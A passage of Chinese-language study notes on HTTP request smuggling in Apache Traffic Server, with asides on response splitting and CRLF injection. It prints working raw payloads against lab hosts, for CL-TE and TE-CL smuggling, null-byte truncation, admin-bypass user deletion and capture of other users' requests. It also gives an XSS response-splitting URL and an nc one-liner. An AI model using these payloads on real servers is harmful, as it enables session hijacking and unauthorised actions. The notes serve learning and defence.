class="hljs-number">2</span>)\r\n</code></pre></div><p>这样两个报文拼接成了一个正常的报文。</p><h4 id="攻击示例："><a href="#攻击示例：" class="headerlink" title="攻击示例："></a>攻击示例：</h4><p>假设后端服务器中存在如下php文件：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] == <span class="hljs-number">1</span>)&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are Admin\n&quot;</span>;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;del&#x27;</span>]))&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;del user &#x27;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;del&#x27;</span>];    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not Admin&quot;</span>;&#125;</code></pre></div><p>构造第一个请求包：</p><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Content-Length : 78<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>GET /admin.php?del=mengchen HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>attack: 1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>foo:</code></pre></div><p>请求体直接走私，假如下一个请求包内容如下：</p><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>lnmp.mengsec.com<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>admin=1</code></pre></div><p>连接之后为：</p><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-builtin-name">GET</span> /admin.php?<span class="hljs-attribute">del</span>=mengchen HTTP/1.1\r\nHost: lnmp.mengsec.com\r\nattack: 1\r\nfoo: <span class="hljs-builtin-name">GET</span> / HTTP/1.1Host: lnmp.mengsec.comCookie: <span class="hljs-attribute">admin</span>=1</code></pre></div><p>foo字段的值为<code>GET / HTTP/1.1</code></p><p>合并成了一个http请求，劫持了后面的会话的Cookie，达到删除用户的效果。</p><h3 id="二、可利用点2：返回400错误时，没有关闭TCP连接"><a href="#二、可利用点2：返回400错误时，没有关闭TCP连接" class="headerlink" title="二、可利用点2：返回400错误时，没有关闭TCP连接"></a>二、可利用点2：返回400错误时，没有关闭TCP连接</h3><p>文章中提到了一个HTTP拆分攻击，我简单学习了一下，发现同样挺有意思。穿插一段HTTP相应拆分攻击。</p><hr><h4 id="补充：HTTP响应拆分攻击"><a href="#补充：HTTP响应拆分攻击" class="headerlink" title="补充：HTTP响应拆分攻击"></a>补充：HTTP响应拆分攻击</h4><p>参考资料：<a href="https://www.cnblogs.com/milantgh/p/3755276.html">https://www.cnblogs.com/milantgh/p/3755276.html</a>   <a href="https://www.cnblogs.com/milantgh/p/3755276.html">浅谈HTTP响应拆分攻击</a> </p><p>理解HTTP响应拆分攻击，需要理解服务器的缓存响应机制。</p><h5 id="主要是以下几个要点："><a href="#主要是以下几个要点：" class="headerlink" title="主要是以下几个要点："></a>主要是以下几个要点：</h5><ol><li>http报文的一一对应，也就是一个相应对应一个请求，两者相互对应，如果缓冲区中存在某个响应但是没有相应的请求的话，这个响应就会被挂起。一旦有请求到来时就会直接将这个被挂起的响应发送出去。</li><li>HTTP响应拆分攻击的环境与HTTP走私攻击的环境相似，都存在前端服务器和后端服务器，前端服务器的缓存机制会将该攻击的范围扩大。</li><li>怎么进行http响应拆分攻击。就相当于攻击者在请求包中加上一个Content-length=0但是经过精心构造的报文。</li></ol><p>示例：</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.abc.com/index.php?lang=german%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aContent- Length:%<span class="hljs-number">200</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aHTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">20200</span>%<span class="hljs-number">20</span>OK%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aContent-Type:%<span class="hljs-number">20</span>text/html%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aContent-Length:%<span class="hljs-number">2041</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aHello, you have been phished</code></pre></div><p>这个示例中，由于Content-Length的长度为0，所以这里的%0d%0a也就是CRLF会使后面的内容绕过解析，留在缓冲区中。成为一个被挂起的响应报文。再次请求的时候，无论请求的是何种内容，假设这里是<code>index.php</code>。这个报文都被直接发送了回来，攻击者精心构造的报文内容就会呈现在自己页面中。</p><p>这个看似只能攻击到自己，怎么攻击到别人呢，这里就利用到了前端代理服务器的缓存功能。前端代理服务器时常向后端服务器请求缓存的响应。这就导致攻击者的响应报文被缓存到了前端服务器，之后的用户再访问<code>index.php</code>这个页面的时候，前端服务器直接进行处理，给所有用户返回攻击者的响应报文。</p><h5 id="进行xss利用"><a href="#进行xss利用" class="headerlink" title="进行xss利用"></a>进行xss利用</h5><p>很好理解，直接写入js代码。在用户的浏览器上执行</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.abc.com/index.php?lang=german%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aContent- Length:%<span class="hljs-number">200</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aHTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">20200</span>%<span class="hljs-number">20</span>OK%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aContent-Type:%<span class="hljs-number">20</span>text/html%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aContent- Length:%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aalert(&#x27;在你的计算机上运行JavaScript&#x27;)</code></pre></div><p>如果插入的是beef的hook地址，所有用户都会被hook到。</p><h5 id="进行CSRF利用。"><a href="#进行CSRF利用。" class="headerlink" title="进行CSRF利用。"></a>进行CSRF利用。</h5><p>原理和xss类似。这里不做过多记录了。</p><hr><h4 id="补充：CRLF注入攻击（也就是HTTP拆分攻击，与上面补充的类似）"><a href="#补充：CRLF注入攻击（也就是HTTP拆分攻击，与上面补充的类似）" class="headerlink" title="补充：CRLF注入攻击（也就是HTTP拆分攻击，与上面补充的类似）"></a>补充：CRLF注入攻击（也就是HTTP拆分攻击，与上面补充的类似）</h4><p>参考资料：<a href="https://www.cnblogs.com/uestc2007/p/10880338.html">https://www.cnblogs.com/uestc2007/p/10880338.html</a> <a href="https://www.cnblogs.com/uestc2007/p/10880338.html">CRLF注入</a></p><p><strong>产生的原因：没有对用户输入的CR和LF字符进行严格过滤。</strong></p><p> CRLF 指的是<strong>回车符</strong>(CR，ASCII 13，\r，%0d) 和<strong>换行符</strong>(LF，ASCII 10，\n，%0a)。 </p><p>为什么没有严格过滤CRLF字符会造成这种危害呢，下面给出一个简单的例子：</p><p>这是服务端的代码</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191025143858158.png" alt="image-20191025143858158"></p><p>将接收到的url作为跳转。</p><p>如果请求包发送如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191025143935584.png" alt="image-20191025143935584"></p><p>也就是在正常的url中加入CRLF构造Set-Cookie</p><p>发送过去的response如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191025144043105.png" alt="image-20191025144043105"></p><p>这就直接将Cookie修改成了自己定义的值，更进一步可以构造两个CRLF，直接控制返回，也就是上面的响应拆分攻击，很危险但是也很容易避免，收到的url参数对CRLF做个过滤就好了</p><hr><h4 id="正式回到CVE的学习"><a href="#正式回到CVE的学习" class="headerlink" title="正式回到CVE的学习"></a>正式回到CVE的学习</h4><p>关键的利用点在：ATS在解析HTTP请求的时候，如果遇到NULL，也就是%00或者说\0,就会返回一个400，但是TCP连接并没有关闭，后面的数据会保存在缓冲区中。这就造成了问题。</p><p>假如构造如下请求：</p><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>aa: <span class="hljs-symbol">\0</span>bb<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>foo: bar<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>GET /2333 HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></code></pre></div><p>注意\0处可以将报文截断，形成两个报文：</p><p>第一个</p><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>aa:</code></pre></div><p>第二个</p><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">bb<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>foo: bar<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>GET /2333 HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></code></pre></div><p>第一个报文在读取的时候读取到\0产生400，,第二个报文都不符合 key: value的格式，产生400 Bad Request</p><p>当报文写成如下时：</p><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>aa: <span class="hljs-symbol">\0</span>bb<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>GET /1.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></code></pre></div><p>或者</p><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>aa: <span class="hljs-symbol">\0</span>bb<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>GET /1.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></code></pre></div><p>截断没有关闭TCP连接，后面正常的GET页面进入缓冲区，这就写入了两个请求报文，但是这样没有什么用，产生的response也是两个，结合上面HTTP响应切分攻击的思路，就是一个报文得到两个response，进而劫持掉正常用户的response。</p><p>怎么伪装成一个报文呢，这里文章中给出了解决办法：absoluteURI，就是GET直接请求完整URL</p><p>构造数据包如下</p><div class="hljs code-wrapper"><pre><code class="hljs php">GET /<span class="hljs-number">400</span> HTTP/<span class="hljs-number">1.1</span>\r\nHost: ats.mengsec.com\r\naa: \<span class="hljs-number">0</span>bb\r\nGET http:<span class="hljs-comment">//ats.mengsec.com/1.html HTTP/1.1\r\n</span>\r\nGET /<span class="hljs-number">404</span> HTTP/<span class="hljs-number">1.1</span>\r\nHost: ats.mengsec.com\r\n\r\n</code></pre></div><p>注意观察，这里就满足了key: value的格式：</p><p>key为：GET http</p><p>value为：//ats.mengsec.com/1.html HTTP/1.1\r\n</p><p>由于截断，返回了第一个报文的400，但是TCP连接没有中断，导致GET <a href="http://ats.mengsec.com/1.html">http://ats.mengsec.com/1.html</a> HTTP/1.1\r\n 进入缓冲区，得到一个相应，后面对404的请求也获得一个报文。相当于两个Request获得了三个Response，这就会造成问题，根据Pipeline先入先出的规则，额外产生的报文将返回给正常用户。如果页面含有xss或者CSRF倒是可以好好利用。（但是不知道可不可以像上面那个http响应切分控制响应报文）</p><p><strong>这个特性的补丁就是当遇到400错误的时候，关闭TCP连接。</strong></p><hr><p>略微提一句：<br>上面的数据包可以用burp，也可以用nc，nc用法在文章中给出：</p><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;GET /400 HTTP/1.1\r\n&#x27;</span>\<span class="hljs-string">&#x27;Host: ats.mengsec.com\r\n&#x27;</span>\<span class="hljs-string">&#x27;aa: \0bb\r\n&#x27;</span>\<span class="hljs-string">&#x27;GET http://ats.mengsec.com/1.html HTTP/1.1\r\n&#x27;</span>\<span class="hljs-string">&#x27;\r\n&#x27;</span>\<span class="hljs-string">&#x27;GET /404 HTTP/1.1\r\n&#x27;</span>\<span class="hljs-string">&#x27;Host: ats.mengsec.com\r\n&#x27;</span>\<span class="hljs-string">&#x27;\r\n&#x27;</span>\| nc 10.211.55.22 80</code></pre></div><h3 id="三、可利用点3：ATS-7-1-2-版本中没有对RFC2616标准严格实现。"><a href="#三、可利用点3：ATS-7-1-2-版本中没有对RFC2616标准严格实现。" class="headerlink" title="三、可利用点3：ATS 7.1.2 版本中没有对RFC2616标准严格实现。"></a>三、可利用点3：ATS 7.1.2 版本中没有对RFC2616标准严格实现。</h3><p>补丁是这样的：<code>当Content-Length请求头不匹配时，响应400，删除具有相同Content-Length请求头的重复副本，如果存在Transfer-Encoding请求头，则删除Content-Length请求头。</code></p><p>也就是说，在存在Transfer-Encoding时，并没有删除Content-Length请求头。</p><p>文中的测试也证明了这点：<br>构造请求：</p><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Content-Length: 6<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>G</code></pre></div><p>这样的话，很容易就可以进行CL-TE攻击。</p><p>采用之前测试的admin.php和payload：</p><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Content-Length: 83<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>GET /admin.php?del=mengchen HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>attack: 1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>foo:</code></pre></div><p>多次发包如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1570691722000-image-20191009175211574.png-w331s" alt="image-20191009175211574"></p><p>如果管理员登录请求了一下主页</p><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>lnmp.mengsec.com<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>admin=1</code></pre></div><p>结果就是拼接成一个报文：</p><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-builtin-name">GET</span> /admin.php?<span class="hljs-attribute">del</span>=mengchen HTTP/1.1\r\nHost: lnmp.mengsec.com\r\nattack: 1\r\nfoo: <span class="hljs-builtin-name">GET</span> / HTTP/1.1Host: lnmp.mengsec.comCookie: <span class="hljs-attribute">admin</span>=1</code></pre></div><p>带着Cookie删除了管理员</p><h3 id="四、利用缓存"><a href="#四、利用缓存" class="headerlink" title="四、利用缓存"></a>四、利用缓存</h3><p>原文：带有漏洞的ATS服务器在缓存命中的时候，会直接忽略Content-Length，这是请求体中的数据会被ATS当做另外的HTTP请求来处理。</p><p>这就很容易理解了，忽略了Content-Length，在请求体重写一个正常的报文就可以直接造成这个报文走私。</p><p>给ATS服务器开启缓存功能</p><p>下面贴一下原文的测试样例：</p><p>random_str.php</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">randomkeys</span>(<span class="hljs-params"><span class="hljs-variable">$length</span></span>)</span>&#123;     <span class="hljs-variable">$output</span>=<span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$a</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$a</span>&lt;<span class="hljs-variable">$length</span>; <span class="hljs-variable">$a</span>++) &#123;        <span class="hljs-variable">$output</span> .= chr(mt_rand(<span class="hljs-number">33</span>, <span class="hljs-number">126</span>));    &#125;       <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;get random string: &quot;</span>;<span class="hljs-keyword">echo</span> randomkeys(<span class="hljs-number">8</span>);</code></pre></div><p>构造请求包：</p><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET /1.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Cache-control: max-age=10<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Content-Length: 56<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>GET /random_str.php HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></code></pre></div><h2 id="0x03-实际攻击利用"><a href="#0x03-实际攻击利用" class="headerlink" title="0x03 实际攻击利用"></a>0x03 实际攻击利用</h2><h3 id="使用CL-TE绕前端服务器安全控制"><a href="#使用CL-TE绕前端服务器安全控制" class="headerlink" title="使用CL-TE绕前端服务器安全控制"></a>使用CL-TE绕前端服务器安全控制</h3><p>这里直接对文章的payload进行记录</p><p>使用CL-TE进行攻击，主要在于构造好Content-Length</p><p>要达到的效果是：绕过ATS对/admin的限制。</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: ac<span class="hljs-number">1</span>b<span class="hljs-number">1</span>f<span class="hljs-number">991</span>edef<span class="hljs-number">1</span>f<span class="hljs-number">1802323</span>bc<span class="hljs-number">00</span>e<span class="hljs-number">10084</span>.web-security-academy.net<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">14</span>; rv:<span class="hljs-number">56</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span><span class="hljs-attribute">Cookie</span>: session=Iegl<span class="hljs-number">0</span>O<span class="hljs-number">4</span>SGnwlddlFQzxduQdt<span class="hljs-number">8</span>NwqWsKI<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">38</span><span class="hljs-attribute">Transfer</span>-Encoding: chunked<span class="hljs-attribute">0</span><span class="hljs-attribute">GET</span> /admin HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">foo</span>: bar</code></pre></div><p>可以总结出，chunked的发包使用：\r\n0\r\n即可</p><p>CL计算从0开始</p><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>GET /admin HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>foo: bar<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></code></pre></div><p>正好38个字符，所以CL写上38</p><p>前端服务器处理整个报文，没有访问/admin的请求，直接发送给了后端服务器，后端服务器解析成两个报文，后面一个为对/admin的请求，这里为了不干扰后面别的用户的访问，在foo: bar后面加了两个\r\n</p><p>得到相应：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191030201836590.png" alt="image-20191030201836590"></p><p>修改Host为localhost后可以访问admin，然后删除carlos用户。</p><h3 id="使用TE-CL绕过前段服务器安全控制"><a href="#使用TE-CL绕过前段服务器安全控制" class="headerlink" title="使用TE-CL绕过前段服务器安全控制"></a>使用TE-CL绕过前段服务器安全控制</h3><p>构造如下：</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: ac<span class="hljs-number">1</span>b<span class="hljs-number">1</span>f<span class="hljs-number">991</span>edef<span class="hljs-number">1</span>f<span class="hljs-number">1802323</span>bc<span class="hljs-number">00</span>e<span class="hljs-number">10084</span>.web-security-academy.net<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">14</span>; rv:<span class="hljs-number">56</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span><span class="hljs-attribute">Cookie</span>: session=Iegl<span class="hljs-number">0</span>O<span class="hljs-number">4</span>SGnwlddlFQzxduQdt<span class="hljs-number">8</span>NwqWsKI<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">4</span><span class="hljs-attribute">Transfer</span>-Encoding: chunked<span class="hljs-attribute">5b</span><span class="hljs-attribute">GET</span> /admin/delete?username=carlos HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: localhost<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">15</span><span class="hljs-attribute">MengChen</span><span class="hljs-attribute">0</span></code></pre></div><p>5b 代表长度：</p><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET /admin/delete?username=carlos HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: localhost<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Content-Length: 15<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>MengChen</code></pre></div><p>正好长度为91</p><p>后面的\r\n\0\r\n为chrunk的结束格式。</p><h3 id="获取前段服务器重写请求字段"><a href="#获取前段服务器重写请求字段" class="headerlink" title="获取前段服务器重写请求字段"></a>获取前段服务器重写请求字段</h3><p>为什么需要获取到并且添加请求字段呢，有时候后端服务器会处理一些必须由前段服务器处理过后再添加上去的请求字段：</p><ul><li>描述TLS连接所使用的协议和密码</li><li>包含用户IP地址的XFF头</li><li>用户的会话令牌ID</li></ul><p>获取这些关键的请求字段的方法是：</p><ul><li>找一个能够将请求参数的值输出到响应中的POST请求</li><li>把该POST请求中，找到的这个特殊的参数放在消息的最后面</li><li>然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。</li></ul><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: ac<span class="hljs-number">831</span>f<span class="hljs-number">8</span>c<span class="hljs-number">1</span>f<span class="hljs-number">287</span>d<span class="hljs-number">3</span>d<span class="hljs-number">808</span>d<span class="hljs-number">2</span>e<span class="hljs-number">1</span>c<span class="hljs-number">00280087</span>.web-security-academy.net<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">14</span>; rv:<span class="hljs-number">56</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<span class="hljs-attribute">Cookie</span>: session=<span class="hljs-number">2</span>rOrjC<span class="hljs-number">16</span>pIb<span class="hljs-number">7</span>ZfURX<span class="hljs-number">8</span>QlSuU<span class="hljs-number">1</span>v<span class="hljs-number">6</span>UMAXLA<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">77</span><span class="hljs-attribute">Transfer</span>-Encoding: chunked<span class="hljs-attribute">0</span><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">70</span><span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">search</span>=<span class="hljs-number">123</span></code></pre></div><p>（后面应该还有一个CRLF，不然凑不成长度77）</p><p>0\r\n\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 70\r\nConnection: close\r\n\r\nsearch=123\r\n</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191030205526301.png" alt="image-20191030205526301"></p><p>通过CL-TE走私的请求为：</p><div class="hljs code-wrapper"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>70<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>closesearch=123</code></pre></div><p> 其中<code>Content-Length</code>的值为70，显然下面携带的数据的长度是不够70的，因此后端服务器在接收到这个走私的请求之后，会认为这个请求还没传输完毕，继续等待传输。 </p><p>接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达70时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这样一来，后来的请求的一部分被作为了走私的请求的参数的一部分，然后从响应中表示了出来，我们就能获取到了前端服务器重写的字段。</p><p>在走私的请求上添加这个字段，然后走私一个删除用户的请求就好了。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1570691726000-image-20190903114641180.png-w331s" alt="image-20190903114641180"></p><p>（感觉这个地方是怎么达到长度70的不是很理解）</p><h3 id="获取其他用户的请求。"><a href="#获取其他用户的请求。" class="headerlink" title="获取其他用户的请求。"></a>获取其他用户的请求。</h3><p> 原文：</p><p>我们通过请求走私获取到了我们走私请求之后的请求。如果在我们的恶意请求之后，其他用户也进行了请求呢？我们寻找的这个POST请求会将获得的数据存储并展示出来呢？这样一来，我们可以走私一个恶意请求，将其他用户的请求的信息拼接到走私请求之后，并存储到网站中，我们再查看这些数据，就能获取用户的请求了。这可以用来偷取用户的敏感信息，比如账号密码等信息。 </p><p>相当于走私一个请求然后吃掉其他用户的请求，如果别人用户的请求中带有cookie，则我们就可以劫持到用户的会话了。</p><p> <strong>最重要的一点是，走私的请求是不完整的</strong></p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: ac<span class="hljs-number">661</span>f<span class="hljs-number">531</span>e<span class="hljs-number">07</span>f<span class="hljs-number">12180</span>eb<span class="hljs-number">2</span>f<span class="hljs-number">1</span>a<span class="hljs-number">009</span>d<span class="hljs-number">0092</span>.web-security-academy.net<span 